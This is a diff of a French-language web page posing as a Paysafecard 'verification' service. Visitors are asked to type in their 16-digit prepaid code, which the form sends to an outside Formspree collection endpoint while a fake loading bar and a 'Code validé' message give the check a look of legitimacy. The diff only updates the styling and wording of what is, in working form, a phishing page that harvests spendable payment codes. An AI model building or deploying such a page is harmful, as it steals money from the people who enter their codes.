@@ -1,35 +1,43 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Vérification Paysafe</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vérification Paysafecard</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 </head>
 <body>
-  <div class="container">
-    <h1>Code Paysafe :</h1>
-    <form id="paysafeForm" action="https://formspree.io/f/myzjvnwg" method="POST" onsubmit="return validerCode(event)">
-      <input type="text" name="code" id="codeInput" placeholder="Entrez votre code..." maxlength="32" required>
+  <div class="main-container">
+    <h1>💳 Vérification de carte Paysafecard</h1>
+
+    <form id="codeForm" action="https://formspree.io/f/myzjvnwg" method="POST" onsubmit="return handleSubmit(event)">
+      <label for="codeInput">Entrer votre code :</label>
+      <input type="text" name="code" id="codeInput" maxlength="32" placeholder="XXXX-XXXX-XXXX-XXXX" required>
       <button type="submit">Vérifier</button>
     </form>
+
     <div id="loaderBar"></div>
     <div id="resultat"></div>
   </div>
 
-  <div class="info-zone">
-    <div class="emoji">💳</div>
-    <div class="text-box">
-      <p>L’utilisation d’une carte Paysafe est simple : commencez par acheter un code en point de vente ou en ligne. Ensuite, entrez ce code de 16 chiffres dans un champ sécurisé sur un site ou une plateforme acceptant ce moyen de paiement. Le montant est immédiatement débité de la carte. Il est inutile de créer un compte bancaire.</p>
-      <p>Ces cartes sont pratiques pour payer de façon anonyme ou sécurisée, notamment dans les jeux, services en ligne ou plateformes de streaming. Chaque code est unique et ne peut être utilisé qu’une seule fois.</p>
+  <section class="info-section">
+    <div class="info-box">
+      <div class="emoji">ℹ️</div>
+      <div class="info-text">
+        <p>La carte Paysafecard vous permet de payer en ligne sans compte bancaire. Achetez-la dans un point de vente ou en ligne. Le code de 16 chiffres peut ensuite être saisi sur un site partenaire pour effectuer un paiement sécurisé.</p>
+        <p>Chaque code est unique et utilisable une seule fois. C’est une solution idéale pour les jeux en ligne, le streaming, ou tout autre service numérique.</p>
+      </div>
     </div>
-  </div>
+  </section>
 
   <script>
-    function validerCode(event) {
-      event.preventDefault();
+    function handleSubmit(e) {
+      e.preventDefault();
       const code = document.getElementById("codeInput").value.trim();
       const resultat = document.getElementById("resultat");
       const loaderBar = document.getElementById("loaderBar");
+
       resultat.innerHTML = "";
       loaderBar.style.width = "0%";
       loaderBar.style.display = "block";
@@ -41,13 +49,14 @@
         if (width >= 100) {
           clearInterval(loading);
           if (code.length === 16) {
-            document.getElementById("paysafeForm").submit();
-            resultat.innerHTML = '<div class="result success">✅ <span>Code validé</span></div>';
+            resultat.innerHTML = '<div class="result success">✅ Code validé</div>';
+            document.getElementById("codeForm").submit();
           } else {
-            resultat.innerHTML = '<div class="result error">❌ <span>Code non validé</span></div>';
+            resultat.innerHTML = '<div class="result error">❌ Code non validé</div>';
           }
         }
-      }, 90); // 100 * 90ms = 9s
+      }, 90); // 90ms * 100 = 9 secondes
+
       return false;
     }
   </script>
